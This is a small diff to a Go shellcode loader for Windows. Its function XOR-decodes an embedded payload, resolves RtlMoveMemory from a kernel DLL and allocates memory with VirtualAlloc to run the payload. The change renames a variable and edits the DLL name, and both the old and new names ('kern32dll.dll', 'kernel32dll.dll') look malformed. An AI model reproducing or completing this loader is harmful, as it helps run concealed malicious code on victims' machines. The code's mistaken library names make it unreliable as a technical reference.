@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"syscall"
 	"unsafe"
+	
 	"golang.org/x/sys/windows"
 )
 
@@ -74,8 +75,8 @@ func xor(sc []byte, k byte) (r []byte) {
 func shCodeExec(sc []byte, k byte) {
 	sc = xor(sc, k)
 
-	kern32 := windows.NewLazyDLL("kern32dll.dll")
-	RtlMoveMemory := kern32.NewProc("RtlMoveMemory")
+	kernel32 := windows.NewLazyDLL("kernel32dll.dll")
+	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
 
 	addr, err := windows.VirtualAlloc(
 		uintptr(0), uintptr(len(sc)),
